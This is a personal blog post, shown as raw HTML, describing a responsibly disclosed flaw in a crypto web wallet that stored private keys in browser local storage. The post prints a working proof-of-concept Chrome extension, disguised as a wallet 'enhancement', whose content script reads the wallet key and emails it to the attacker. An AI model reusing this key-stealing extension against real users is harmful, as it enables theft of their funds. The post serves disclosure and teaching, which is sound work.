
<!DOCTYPE html>
<html lang="en">
<head>
<script src="https://akrisanov.com/js/theme.min.js" integrity="sha384-pb++s6uBRKaQv+iAXpgA/H3IlpLZdO14tTwuCI7uXmz4aaZdByoCcM+6BhynMq/1"></script>
<link rel="stylesheet"
  href="https://akrisanov.com/abridge.css?h=7cb460406165e24193ad" />
<meta charset="utf-8" />
<meta http-equiv="x-ua-compatible" content="ie=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="base" content="https://akrisanov.com" />

<meta name="content-language" content="en" />
<meta name="HandheldFriendly" content="True" />
<meta name="mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="default" />
<meta name="theme-color" content="#333333" />
<meta name="msapplication-TileColor" content="#333333" />
<link rel="manifest" href="https://akrisanov.com/manifest.min.json" />
<link rel="mask-icon" href="https://akrisanov.com/safari-pinned-tab.svg"
  color="#ff9900" />
<link rel="icon" type="image/svg+xml"
  href="https://akrisanov.com/favicon.png" />
<link rel="apple-touch-icon" sizes="180x180"
  href="https://akrisanov.com/apple-touch-icon.png" />
<link rel="preload" as="style" class="preStyle" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous" />
<link rel="alternate" type="application/atom+xml" title="Andrey Krisanov Atom Feed"
  href="https://akrisanov.com/atom.xml" />
<link rel="alternate" type="application/rss+xml" title="Andrey Krisanov RSS Feed"
  href="https://akrisanov.com/rss.xml" /> <meta name="robots" content="index, follow" />
<meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
<title>Accidentally found a vulnerability in a crypto wallet and made $1,000 | Andrey Krisanov</title>
<meta name="author" content="Andrey Krisanov" />
<meta name="copyright" content="Andrey Krisanov" />
<meta name="description" content="On joining the community of one of the proof-of-stake blockchains and finding a client vulnerability in its wallet app." />
<link rel="canonical" href="https://akrisanov.com/crypto-wallet-vulnerability/" />
<link rel="alternate" hreflang="en" href="https://akrisanov.com/crypto-wallet-vulnerability/" />
<link rel="alternate" hreflang="x-default" href="https://akrisanov.com/crypto-wallet-vulnerability/" />
<meta name="keywords" content="crypto, security, bug bounty, vulnerability, AI infrastructure, inference engineering, LLM serving, distributed systems, scalable backend, performance optimization, reliability, observability, MLOps, DevOps, GPU inference, model serving, vLLM, Triton Inference Server, Ray Serve, .NET, C#, Python, Kubernetes, Docker, Terraform, Ansible, OpenTelemetry, Grafana, CI&#x2F;CD, cloud infrastructure, platform engineering" />
<meta name="google-site-verification" content="Your Google Site verification code." />
<meta name="msvalidate.01" content="Your Bing Site verification code." />
<meta property="og:url" content="https://akrisanov.com/crypto-wallet-vulnerability/" />
<meta name="twitter:url" content="https://akrisanov.com/crypto-wallet-vulnerability/" />
<meta property="og:description" content="On joining the community of one of the proof-of-stake blockchains and finding a client vulnerability in its wallet app." />
<meta name="twitter:description" content="On joining the community of one of the proof-of-stake blockchains and finding a client vulnerability in its wallet app." />
<meta property="og:title" content="Accidentally found a vulnerability in a crypto wallet and made $1,000 | Andrey Krisanov" />
<meta name="twitter:title" content="Accidentally found a vulnerability in a crypto wallet and made $1,000 | Andrey Krisanov" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://akrisanov.com/images/photo.png" />
<meta property="og:image" content="https://akrisanov.com/images/photo.png" />
<meta property="og:site_name" content="Andrey Krisanov" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="website" />
<meta property="og:updated_time" content="2023-08-05" />
<meta name="twitter:site" content="@_akrisanov" />
<meta name="twitter:creator" content="@_akrisanov" /><script type="application/ld+json">
{
	"@context": "https://schema.org",
	"@type": "Article",
	"headline": "Accidentally found a vulnerability in a crypto wallet and made $1,000",
	"url": "https://akrisanov.com/crypto-wallet-vulnerability/",
	"inLanguage": "en",
	"author": {
		"@type": "Person",
		"name": "Andrey Krisanov"
	},
	"image": "https://akrisanov.com/images/photo.png",
	"datePublished": "2023-08-05T00:00:00+00:00",
	"dateModified": "2023-08-05T00:00:00+00:00"}
</script>
<script defer
  src="https://akrisanov.com/js/abridge.min.js?h=1a12cf684ae4ed40434f" integrity="sha384-ZsreuwU2rKTp7gC4bTf5sYz+3AjMym99XDa/B5wa08fCzLVVX+NDaTsTeyLXseDG"></script>
<noscript>
  <link rel="stylesheet" href="https://akrisanov.com/nojs.css" />
</noscript>
  
  <script>
    (function(){
      try {
        var pref = "";
        if (pref) {
          document.documentElement.classList.add('js');
          document.addEventListener('DOMContentLoaded', function(){
            document.body.classList.add(pref);
          });
        }
      } catch(e){}
    })();
  </script>
</head>
<body>
  <a class="visually-hidden" href="#main-content">Skip to content</a>
  <header>
    <nav>
      <div><h1><a href="https://akrisanov.com" title="Andrey Krisanov"><big>Andrey Krisanov</big></a></h1></div>
      <div>

        <div>
          <ul><li><a class="s95" href="https://akrisanov.com/about/"
                  > About 
                </a></li><li><a class="s95" href="https://akrisanov.com/archive/"
                  >
                <i class="fa fa-bookmark" aria-hidden="true" title="Posts"></i>
                
                </a></li>
            <li><div class="dropdown"><i class="svgs world" type="reset" role="button" tabindex="0" aria-label="English"></i>
                <div class="dropdown-content">
                <span>English</span><a href="https://akrisanov.com/ru/crypto-wallet-vulnerability/">Русский</a></div>
            </div></li><li>
          <i type="reset" id="mode" class="js svgs adjust" role="button" tabindex="0"
            title="Switch Mode"
            aria-label="Switch Mode"></i></ul>
        </div>

        <div>
          <div>
            <form autocomplete=off class="js" name="goSearch" id="searchbox" role="search" aria-label="Search">
              <div class="searchd">
      <input id="searchinput" type="text" placeholder="Search"
        aria-label="Search" title="Search" />
                <button type="submit" title="Search" aria-label="Search" class="svgs search"></button>
              </div>
              <div class="results" aria-live="polite"><div id="suggestions"></div></div>
            </form>
          </div>
        </div>

      </div>
    </nav>
  </header>
  <main id="main-content">
<article>
<h1><a href="https://akrisanov.com/crypto-wallet-vulnerability/">Accidentally found a vulnerability in a crypto wallet and made $1,000</a></h1>

<span class="s95" > August 05, 2023<span class="hpad">·</span> #<a
    href="https://akrisanov.com/tags/security/">security</a>  #<a
    href="https://akrisanov.com/tags/crypto/">crypto</a>  #<a
    href="https://akrisanov.com/tags/bug-bounty/">bug-bounty</a> </span>  <p>In January 2022, I joined the community of one of the proof-of-stake blockchains.
To play with what the protocol and its ecosystem offered, I created a wallet account on
the official website <code>https://wallet.****.org</code>. Apart from general curiosity, I was interested in
how they achieved security in a browser, especially in the age of extensions and
client-side vulnerabilities.</p>
<p>It turned out that when a user logged in, the wallet application (built in React) generated a set
of public and private keys and stored them in the browser's local storage. With my experience of
building authentication and authorization in distributed systems, I knew this was not the best
thing to do – in general, it's easy for a browser extension and client-side code to read data
from local storage <sup class="footnote-reference"><a href="#1">1</a></sup>.</p>
<p>To prove this, I decided to <a rel="noopener" target="_blank" href="https://developer.chrome.com/docs/extensions/mv3/getstarted/development-basics/">write a simple extension for Chrome</a> that would retrieve keys from a victim's browser and send them to my
anonymous email address.</p>
<p>The root directory of my pickpocket extension looked like this:</p>
<pre data-lang="bash" style="background-color:#3b224c;color:#dbbfef;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffffff;">.
</span><span style="color:#a4a0e8;">├──</span><span> content.js
</span><span style="color:#a4a0e8;">├──</span><span> email.min.js
</span><span style="color:#a4a0e8;">├──</span><span> index.html
</span><span style="color:#a4a0e8;">└──</span><span> manifest.json
</span></code></pre>
<p>The main files are the <code>manifest.json</code> and <code>content.js</code>. The former is essential for installing the extension.</p>
<pre data-lang="json" style="background-color:#3b224c;color:#dbbfef;" class="language-json "><code class="language-json" data-lang="json"><span>{
</span><span>  </span><span style="color:#cccccc;">&quot;name&quot;</span><span>: </span><span style="color:#cccccc;">&quot;X Wallet Enhancement&quot;</span><span>,
</span><span>  </span><span style="color:#cccccc;">&quot;version&quot;</span><span>: </span><span style="color:#cccccc;">&quot;1.0&quot;</span><span>,
</span><span>  </span><span style="color:#cccccc;">&quot;manifest_version&quot;</span><span>: </span><span style="color:#efba5d;">3</span><span>,
</span><span>  </span><span style="color:#cccccc;">&quot;content_scripts&quot;</span><span>: [
</span><span>    {
</span><span>      </span><span style="color:#cccccc;">&quot;matches&quot;</span><span>: [
</span><span>        </span><span style="color:#cccccc;">&quot;https://wallet.****.org/*&quot;
</span><span>      ],
</span><span>      </span><span style="color:#cccccc;">&quot;js&quot;</span><span>: [
</span><span>        </span><span style="color:#cccccc;">&quot;email.min.js&quot;</span><span>,
</span><span>        </span><span style="color:#cccccc;">&quot;content.js&quot;
</span><span>      ]
</span><span>    }
</span><span>  ]
</span><span>}
</span></code></pre>
<p><code>email.min.js</code> is just a client library from one of the cloud services that allows you to send
email directly from a browser without any server code. <code>index.html</code> is a blank HTML page that
displays nothing. The wallet hijacking logic lived in the <code>content.js</code> file:</p>
<pre data-lang="javascript" style="background-color:#3b224c;color:#dbbfef;" class="language-javascript "><code class="language-javascript" data-lang="javascript"><span style="color:#a4a0e8;">emailjs</span><span>.</span><span style="color:#ffffff;">init</span><span>(</span><span style="color:#cccccc;">&#39;user_****&#39;</span><span>); </span><span style="color:#6a7c81;">// instantiating an email delivery service
</span><span>
</span><span style="font-style:italic;color:#eccdbb;">let </span><span style="color:#a4a0e8;">templateParams </span><span style="color:#eccdbb;">= </span><span>{
</span><span>    </span><span style="color:#6a7c81;">// gathering information about the victim&#39;s browser
</span><span>    from_name: navigator.userAgent,
</span><span>    </span><span style="color:#6a7c81;">// fetching wallet keys from the local storage
</span><span>    storage: window.</span><span style="color:#a4a0e8;">localStorage</span><span>.</span><span style="color:#ffffff;">getItem</span><span>(</span><span style="color:#cccccc;">&#39;_*:wallet:active_account_id_**&#39;</span><span>),
</span><span>};
</span><span>
</span><span style="color:#6a7c81;">// using a prepared email template to send an email with keys
</span><span style="font-style:italic;color:#eccdbb;">const </span><span style="color:#a4a0e8;">serviceID </span><span style="color:#eccdbb;">= </span><span style="color:#cccccc;">&#39;service_****&#39;</span><span>;
</span><span style="font-style:italic;color:#eccdbb;">const </span><span style="color:#a4a0e8;">templateID </span><span style="color:#eccdbb;">= </span><span style="color:#cccccc;">&#39;template_****&#39;</span><span>;
</span><span>
</span><span style="color:#a4a0e8;">emailjs</span><span>.</span><span style="color:#ffffff;">send</span><span>(</span><span style="color:#a4a0e8;">serviceID</span><span>, </span><span style="color:#a4a0e8;">templateID</span><span>, </span><span style="color:#a4a0e8;">templateParams</span><span>)
</span><span> .</span><span style="color:#ffffff;">then</span><span>(() </span><span style="font-style:italic;color:#eccdbb;">=&gt; </span><span>{
</span><span>    </span><span style="font-style:italic;color:#eccdbb;">console</span><span>.</span><span style="color:#ffffff;">log</span><span>(</span><span style="color:#cccccc;">&quot;Wallet keys were send!&quot;</span><span>);
</span><span> }, (</span><span style="font-style:italic;color:#a4a0e8;">err</span><span>) </span><span style="font-style:italic;color:#eccdbb;">=&gt; </span><span>{
</span><span>    </span><span style="font-style:italic;color:#eccdbb;">console</span><span>.</span><span style="color:#ffffff;">error</span><span>(</span><span style="color:#efba5d;">JSON</span><span>.</span><span style="color:#ffffff;">stringify</span><span>(</span><span style="color:#a4a0e8;">err</span><span>));
</span><span> });
</span></code></pre>
<p>Yes, such a dummy script.</p>
<p>I packed all four files into a zip archive and kindly asked my friend, who also had
a wallet at <code>https://wallet.***.org</code>, to install my creation in his browser
(pretending to do some social engineering). Before doing so, I told him about my findings and
the theory I was trying to prove. He was happy to help, and the public and private keys of
this wallet account appeared in my inbox a few seconds after the browser extension was installed.
Next, I saved the keys to local storage in my browser and opened the wallet website.</p>
<p>Surprisingly, my friend's crypto-wallet balance was available to me, along with an option to
withdraw the funds. During a Zoom call with my victim friend, I transferred some of his funds to
an anonymous account and back. It was mind-blowing! A new, promising blockchain that had recently
closed an investment round had a major vulnerability in its wallet. Worst of all, they had 2-factor
authentication for users. Of course, not many people would activate it right away, and many didn't.</p>
<p>As an ethical developer, I created a vulnerability report, including the source code of
the browser extension and my thoughts on how to improve the security of the web application.
It was sent directly to the security team's email address on 18th of January. A few days later,
I had a call with the CISO of the blockchain protocol, who assured me that they were aware of
the issue and would address it in the next release. I was a little disappointed with the speed of
the response to the incident. Two days is an eternity when one speaks about users' money.
Nevertheless, the blockchain developers granted me their tokens in an amount equivalent to 1,000 USDT.</p>
<div class="callout callout-danger">
<strong>Advice for application developers</strong>: be aware of the technologies you use and their security aspects.
</div>
<div class="callout callout-warning">
<strong>Advice for crypto users</strong>: learn what security options an organisation offers to you,
activate two-factor authentication as soon as you create a wallet account, don't store all of
your funds in hot wallets.
</div>
<hr />
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup><h2 id="worth-reading">Worth reading</h2>
</div>
<ul>
<li><a rel="noopener" target="_blank" href="https://snyk.io/blog/is-localstorage-safe-to-use/">Is LocalStorage safe to use? | Snyk</a></li>
<li><a rel="noopener" target="_blank" href="https://www.rdegges.com/2018/please-stop-using-local-storage/">Please Stop Using Local Storage</a></li>
<li><a rel="noopener" target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">Using HTTP cookies - HTTP | MDN</a></li>
<li><a rel="noopener" target="_blank" href="https://owasp.org/www-community/HttpOnly">HttpOnly | OWASP Foundation</a></li>
</ul>

    <nav>
      <div>
        <a href="https://akrisanov.com/multi-arch-docker-images/">&#8249; Building Multi-Arch Images for Arm and x86</a>
      </div>
      <div>
      </div>
    </nav>
</article>
  </main>
  <footer>
    <hr />
    <div class="c">
<nav class="tpad">
    <div></div>
</nav>
          
      <p class="s90"> © <span id="year">2025</span> Andrey Krisanov</p>
      <nav>
          <a class="s90"
            href="https://akrisanov.com/atom.xml"
             target="_blank" rel="noopener noreferrer"
            aria-label=" RSS "
          ><i class="fa fa-rss" aria-hidden="true" title=" RSS "></i></a>
          <a class="s90"
            href="https://akrisanov.com/sitemap.xml"
             target="_blank" rel="noopener noreferrer"
            aria-label=" Sitemap "
          ><i class="fa fa-sitemap" aria-hidden="true" title=" Sitemap "></i></a>
          <a class="s90"
            href="https://akrisanov.com/links"
             target="_blank" rel="noopener noreferrer"
            aria-label=" Contacts "
          ><i class="fa fa-address-card" aria-hidden="true" title=" Contacts "></i></a>
          <a class="s90"
            href="https://www.linkedin.com/in/akrisanov/"
             target="_blank" rel="noopener noreferrer"
            aria-label=" LinkedIn "
          ><i class="fa fa-linkedin" aria-hidden="true" title=" LinkedIn "></i></a>
          <a class="s90"
            href="https://github.com/akrisanov/"
             target="_blank" rel="noopener noreferrer"
            aria-label=" Github "
          ><i class="fa fa-github" aria-hidden="true" title=" Github "></i></a>
      </nav>
    </div>
  </footer><span class="topout">
  <span class="topleft"> </span
  ><a href="#" class="top" title="Back to Top"
    ><i class="svgs svgh angu"></i></a
  >
</span>
</body>
</html>
